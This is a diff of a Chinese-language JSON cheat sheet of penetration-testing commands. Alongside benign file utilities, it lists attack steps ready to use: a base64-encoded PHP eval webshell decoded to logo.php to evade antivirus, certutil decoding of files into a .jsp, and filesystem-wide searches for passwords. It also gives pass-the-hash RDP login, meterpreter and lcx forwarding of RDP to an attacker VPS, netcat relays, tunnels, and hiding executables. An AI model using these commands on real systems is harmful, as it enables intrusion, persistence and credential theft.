+							{
+								"command": "%windir%\\system32\\inetsrv\\appcmd list site /site.id:1 /config | findstr \"physicalPath\"",
+								"describe": "查看 Site ID 为 1 的物理路径"
+							}
+						]
+					},
+					"查看 IIS 配置文件": {
+						"Windows": [
+							{
+								"command": "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config\n%SystemRoot%\\System32\\inetsrv\\config\\applicationHost.config",
+								"describe": "查看 IIS 配置文件"
+							}
+						]
+					}
 				},
-				{
-					"command": "zip -r {destination}.zip {source}",
-					"describe": "使用 zip 工具创建一个压缩文件。{source} 是要压缩的文件或文件夹，{destination} 是生成的压缩文件路径。"
+				"文件写入": {
+					"Windows": [
+						{
+							"command": "echo ceshi > C:\\ceshi.txt //写入-覆盖\necho ceshi >> c:\\ceshi.txt //追加有换行\nset /p=ceshi<nul >C:\\ceshi.txt //写入\nset /p=\"ceshi\" >>C:\\ceshi.txt //不换行追加\n\n//powershell不换行追加\npowershell -Command \"[System.IO.File]::AppendAllText('C:\\windows\\temp\\ceshi.txt', 'ceshi')\"\n\n//规避空格\necho.ceshi>>ceshi.txt\necho,ceshi>>ceshi.txt\ntype;ceshi.txt\n\n//将base64编码的文件解码写入到 test.jsp\ncertutil -f -decode base64.txt C:\\\\ceshi.jsp\n\n//将十六进制文件解码写入到 test.jsp\ncertutil -decodehex hex.txt C:\\\\ceshi.jsp",
+							"describe": "使用不同方法写入文件"
+						}
+					]
+				}
+			},
+			"压缩文件": {
+				"Windows": [
+					{
+						"command": "7z.exe a OutputFile InputFile",
+						"describe": "使用7-Zip工具将InputFile压缩成OutputFile。"
+					},
+					{
+						"command": "rar.exe a OutputFile InputFile",
+						"describe": "使用RAR工具将InputFile压缩成OutputFile。"
+					},
+					{
+						"command": "powershell Compress-Archive -Path {source} -DestinationPath {destination}",
+						"describe": "使用 PowerShell 的 Compress-Archive 命令压缩文件或文件夹。{source} 是源文件或文件夹的路径，{destination} 是压缩文件的路径。"
+					},
+					{
+						"command": "tar -a -cf {destination} {source}",
+						"describe": "使用 tar 工具创建一个压缩归档文件。{source} 是要压缩的文件或文件夹，{destination} 是生成的压缩文件路径。"
+					}
+				],
+				"Linux": [
+					{
+						"command": "tar -cvzf {destination}.tar.gz {source}",
+						"describe": "使用 tar 工具创建一个 gzip 压缩的归档文件。{source} 是要压缩的文件或文件夹，{destination} 是生成的压缩文件的基本名称。"
+					},
+					{
+						"command": "zip -r {destination}.zip {source}",
+						"describe": "使用 zip 工具创建一个压缩文件。{source} 是要压缩的文件或文件夹，{destination} 是生成的压缩文件路径。"
+					}
+				]
+			},
+			"解压文件": {
+				"Windows": [
+					{
+						"command": "7z.exe x InputFile OutputFile",
+						"describe": "使用7-Zip工具将InputFile解压到OutputFile。"
+					},
+					{
+						"command": "rar.exe x InputFile OutputFile",
+						"describe": "使用RAR工具将InputFile解压到OutputFile。"
+					},
+					{
+						"command": "powershell Expand-Archive -Path {source} -DestinationPath {destination}",
+						"describe": "使用 PowerShell 的 Expand-Archive 命令解压文件。{source} 是压缩文件的路径，{destination} 是解压后的目标路径。"
+					},
+					{
+						"command": "tar -xf {source} -C {destination}",
+						"describe": "使用 tar 工具解压归档文件。{source} 是压缩文件的路径，{destination} 是解压后的目标路径。"
+					}
+				],
+				"Linux": [
+					{
+						"command": "tar -cvzf {destination}.tar.gz {source}",
+						"describe": "使用 tar 工具创建一个 gzip 压缩的归档文件。{source} 是要压缩的文件或文件夹，{destination} 是生成的压缩文件的基本名称。"
+					},
+					{
+						"command": "zip -r {destination}.zip {source}",
+						"describe": "使用 zip 工具创建一个压缩文件。{source} 是要压缩的文件或文件夹，{destination} 是生成的压缩文件路径。"
+					},
+					{
+						"command": "tar -xvzf {source}.tar.gz -C {destination}",
+						"describe": "使用 tar 工具解压 gzip 压缩的归档文件。{source} 是压缩文件的路径，{destination} 是解压后的目标路径。"
+					},
+					{
+						"command": "unzip {source}.zip -d {destination}",
+						"describe": "使用 unzip 工具解压 zip 格式的压缩文件。{source} 是压缩文件的路径，{destination} 是解压后的目标路径。"
+					}
+				]
+			},
+			"创建隐藏文件": {
+				"Windows": [
+					{
+						"command": "attrib +s +h +r *.exe",
+						"describe": "将指定目录下的所有exe文件标记为系统、隐藏和只读"
+					}
+				],
+				"Linux": [
+					{
+						"command": "mv filename.exe .filename.exe",
+						"describe": "通过在文件名前加上点（.）将文件隐藏"
+					}
+				]
+			},
+			"终端搜索软件": {
+				"Linux": [
+					{
+						"command": "find / -name pass.txt",
+						"describe": "在整个文件系统中搜索名为pass.txt的文件"
+					}
+				]
+			},
+			"查找后缀properties文件内容带password字样": {
+				"Linux": [
+					{
+						"command": "find / -name *.properties | xargs grep password",
+						"describe": "在所有后缀为.properties的文件中查找包含password字样的行"
+					}
+				]
+			},
+			"tomcat目录文件和文件夹列表导出到oa.txt": {
+				"Linux": [
+					{
+						"command": "find /home/tomcat/ -type f > oa.txt",
+						"describe": "列出/home/tomcat/目录下的所有文件，并将结果保存到oa.txt"
+					}
+				]
+			},
+			"编码字符base64然后echo输出logo.php再进行解码": {
+				"Linux": [
+					{
+						"command": "echo -n \"PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4+\" | base64 -d > logo.php",
+						"describe": "将base64编码的字符串解码为logo.php文件，绕过杀软拦截"
+					}
+				]
+			},
+			"查看历史命令": {
+				"Windows": [
+					{
+						"command": "type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt",
+						"describe": "查看当前用户PowerShell的历史命令记录。"
+					},
+					{
+						"command": "type %appdata%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt",
+						"describe": "查看所有用户PowerShell的历史命令记录。"
+					}
+				],
+				"Linux": [
+					{
+						"command": "cat ~/.bash_history",
+						"describe": "查看当前用户 Bash 的历史命令记录。"
+					},
+					{
+						"command": "cat /var/log/auth.log | grep 'COMMAND' ",
+						"describe": "查看系统日志中记录的历史命令（可能需要 root 权限）。"
+					}
+				]
+			},
+			"计算文件hash": {
+				"Windows": [
+					{
+						"command": "certutil.exe -hashfile 1.txt",
+						"describe": "使用 certutil 工具计算指定文件的哈希值。"
+					}
+				],
+				"Linux": [
+					{
+						"command": "sha256sum 1.txt",
+						"describe": "计算指定文件的 SHA-256 哈希值。"
+					},
+					{
+						"command": "md5sum 1.txt",
+						"describe": "计算指定文件的 MD5 哈希值。"
+					}
+				]
+			},
+			"强制停止进程": {
+				"Windows": [
+					{
+						"command": "taskkill /f /pid 3352",
+						"describe": "强制停止指定 PID（3352）的进程。"
+					},
+					{
+						"command": "taskkill /f /im explor.exe",
+						"describe": "强制停止指定名称（explor.exe）的进程。"
+					}
+				],
+				"Linux": [
+					{
+						"command": "kill -9 3352",
+						"describe": "强制停止指定 PID（3352）的进程。"
+					},
+					{
+						"command": "pkill -9 process_name",
+						"describe": "强制停止指定名称（process_name）的进程。"
+					}
+				]
+			},
+			"nmap扫描永恒之蓝漏洞": {
+				"Windows": [
+					{
+						"command": "nmap -p445 --script smb-vuln-ms17-010 127.0.0.1",
+						"describe": "使用nmap扫描目标IP的445端口，检查是否存在永恒之蓝漏洞"
+					}
+				]
+			},
+			"meterpreter把目标的3389端口转发到vps的6666端口": {
+				"Windows": [
+					{
+						"command": "portfwd add -l 6666 -p 3389 -r 127.0.0.1",
+						"describe": "在meterpreter会话中，将目标机器的3389端口转发到VPS的6666端口"
+					}
+				]
+			},
+			".net静默安装": {
+				"Windows": [
+					{
+						"command": "dotNetFx40_Full_x86_x64.exe /q /norestart /ChainingPackage FullX64Bootstrapper",
+						"describe": "以静默模式安装.NET Framework 4.0"
+					}
+				]
+			},
+			"lcx端口转发-本地监听": {
+				"Windows": [
+					{
+						"command": "lcx.exe -listen 110 34567目标执行: lcx.exe -slave vpsip 110 127.0.0.1 3389",
+						"describe": "使用lcx进行本地端口监听和远程端口转发"
+					}
+				]
+			},
+			"扫描web.txt文件的网站标题-本地监听": {
+				"Windows": [
+					{
+						"command": "whatweb -i web.txt -p Title whatweb",
+						"describe": "扫描web.txt文件中的网站，并提取其标题信息"
+					}
+				]
+			},
+			"xfreerdp hash连接rdp": {
+				"Windows": [
+					{
+						"command": "xfreerdp /u:administrator /pth:ccef208c6485269c20db2cad21734fe7 /v:10.20.24.100 /cert-ignore //server 2012",
+						"describe": "使用xfreerdp通过密码哈希连接RDP会话"
+					}
+				]
+			},
+			"runas运行其它账户权限的程序": {
+				"Windows": [
+					{
+						"command": "runas /user:hostname\\username /sa \"cmd.exe\"",
+						"describe": "以指定用户身份运行cmd.exe"
+					}
+				]
+			},
+			"端口转发": {
+				"LCX": {
+					"Linux": [
+						{
+							"command": "lcx -<listen|tran|slave>",
+							"describe": "使用lcx工具进行端口转发"
+						},
+						{
+							"command": "cx -listen 4567 33891 #Attacker",
+							"describe": "在攻击者机器上监听端口4567并将其转发到33891"
+						},
+						{
+							"command": "lcx -slave 111.222.333.444 4567 127.0.0.1 3389 # On the targets",
+							"describe": "在目标机器上将端口4567转发到本地3389端口"
+						}
+					]
 				},
-				{
-					"command": "tar -xvzf {source}.tar.gz -C {destination}",
-					"describe": "使用 tar 工具解压 gzip 压缩的归档文件。{source} 是压缩文件的路径，{destination} 是解压后的目标路径。"
+				"SSH": {
+					"Linux": [
+						{
+							"command": "ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]",
+							"describe": "通过SSH进行端口转发，指定本地端口或远程端口"
+						},
+						{
+							"command": "ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port",
+							"describe": "将本地8080端口转发到远程服务器的80端口"
+						},
+						{
+							"command": "ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port",
+							"describe": "将远程服务器的8080端口转发到本地的80端口"
+						}
+					]
 				},
-				{
-					"command": "unzip {source}.zip -d {destination}",
-					"describe": "使用 unzip 工具解压 zip 格式的压缩文件。{source} 是压缩文件的路径，{destination} 是解压后的目标路径。"
-				}
-			]
-		},
-		"创建隐藏文件": {
-			"Windows": [
-				{
-					"command": "attrib +s +h +r *.exe",
-					"describe": "将指定目录下的所有exe文件标记为系统、隐藏和只读"
-				}
-			],
-			"Linux": [
-				{
-					"command": "mv filename.exe .filename.exe",
-					"describe": "通过在文件名前加上点（.）将文件隐藏"
-				}
-			]
-		},
-		"终端搜索软件": {
-			"Linux": [
-				{
-					"command": "find / -name pass.txt",
-					"describe": "在整个文件系统中搜索名为pass.txt的文件"
-				}
-			]
-		},
-		"查找后缀properties文件内容带password字样": {
-			"Linux": [
-				{
-					"command": "find / -name *.properties | xargs grep password",
-					"describe": "在所有后缀为.properties的文件中查找包含password字样的行"
-				}
-			]
-		},
-		"tomcat目录文件和文件夹列表导出到oa.txt": {
-			"Linux": [
-				{
-					"command": "find /home/tomcat/ -type f > oa.txt",
-					"describe": "列出/home/tomcat/目录下的所有文件，并将结果保存到oa.txt"
-				}
-			]
-		},
-		"编码字符base64然后echo输出logo.php再进行解码": {
-			"Linux": [
-				{
-					"command": "echo -n \"PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4+\" | base64 -d > logo.php",
-					"describe": "将base64编码的字符串解码为logo.php文件，绕过杀软拦截"
-				}
-			]
-		},
-		"查看历史命令": {
-			"Windows": [
-				{
-					"command": "type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt",
-					"describe": "查看当前用户PowerShell的历史命令记录。"
+				"mknod": {
+					"Linux": [
+						{
+							"command": "mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe",
+							"describe": "使用mknod创建命名管道，并使用nc进行端口转发"
+						},
+						{
+							"command": "mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe",
+							"describe": "使用mknod和nc将端口8080的数据转发到目标IP的80端口"
+						},
+						{
+							"command": "mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe # Proxy (Port 80 to 8080)",
+							"describe": "创建一个代理，将端口80的数据转发到8080，并记录数据流"
+						},
+						{
+							"command": "mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080)",
+							"describe": "创建一个代理监视器，将端口80的数据转发到8080，并监控数据流"
+						}
+					]
 				},
-				{
-					"command": "type %appdata%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt",
-					"describe": "查看所有用户PowerShell的历史命令记录。"
+				"隧道": {
+					"Linux": [
+						{
+							"command": "ssh -D 127.0.0.1:9050 -N [username]@[ip]",
+							"describe": "创建一个SOCKS代理隧道，通过指定的用户名和IP进行连接"
+						},
+						{
+							"command": "proxychains ifconfig",
+							"describe": "通过proxychains命令查看网络接口配置，检查代理设置"
+						}
+					]
 				}
-			],
-			"Linux": [
-				{
-					"command": "cat ~/.bash_history",
-					"describe": "查看当前用户 Bash 的历史命令记录。"
-				},
-				{
-					"command": "cat /var/log/auth.log | grep 'COMMAND' ",
-					"describe": "查看系统日志中记录的历史命令（可能需要 root 权限）。"
-				}
-			]
-		},
-		"计算文件hash": {
-			"Windows": [
-				{
-					"command": "certutil.exe -hashfile 1.txt",
-					"describe": "使用 certutil 工具计算指定文件的哈希值。"
-				}
-			],
-			"Linux": [
-				{
-					"command": "sha256sum 1.txt",
-					"describe": "计算指定文件的 SHA-256 哈希值。"
-				},
-				{
-					"command": "md5sum 1.txt",
-					"describe": "计算指定文件的 MD5 哈希值。"
-				}
-			]
-		},
-		"强制停止进程": {
-			"Windows": [
-				{
-					"command": "taskkill /f /pid 3352",
-					"describe": "强制停止指定 PID（3352）的进程。"
-				},
-				{
-					"command": "taskkill /f /im explor.exe",
-					"describe": "强制停止指定名称（explor.exe）的进程。"
-				}
-			],
-			"Linux": [
-				{
-					"command": "kill -9 3352",
-					"describe": "强制停止指定 PID（3352）的进程。"
-				},
-				{
-					"command": "pkill -9 process_name",
-					"describe": "强制停止指定名称（process_name）的进程。"
-				}
-			]
-		}
-	},
-	"Wmic常用命令": {
-		"wmic远程连接机器": {
-			"Windows": [
-				{
-					"command": "wmic /node:\"192.168.1.20\" /user:\"domain\\administrator\" /password:\"123456\"",
-					"describe": "使用wmic远程连接到指定IP的机器，并以指定用户和密码进行认证"
-				}
-			]
-		},
-		"查看系统安装软件": {
-			"Windows": [
-				{
-					"command": "wmic product get name,version",
-					"describe": "列出系统中安装的软件及其版本信息"
-				}
-			]
-		},
-		"查看系统版本": {
-			"Windows": [
-				{
-					"command": "wmic OS get Caption,CSDVersion,OSArchitecture,Version",
-					"describe": "获取系统的版本信息，包括操作系统名称、服务包版本、体系结构和版本号"
-				}
-			]
-		},
-		"根据Pid查找进程路径": {
-			"Windows": [
-				{
-					"command": "wmic process get name,executablepath,processid|findstr pid",
-					"describe": "根据进程ID查找进程的名称、路径及ID"
-				}
-			]
-		},
-		"查看磁盘信息": {
-			"Windows": [
-				{
-					"command": "Wmic logicaldisk",
-					"describe": "查看系统中的逻辑磁盘信息"
-				}
-			]
-		},
-		"查看组、hostname等信息": {
-			"Windows": [
-				{
-					"command": "wmic computersystem get Name, Domain, Manufacturer, Model, Username, Roles/format:list",
-					"describe": "获取计算机系统的名称、域、制造商、型号、用户名和角色信息"
-				}
-			]
+			}
 		}
 	}
 }
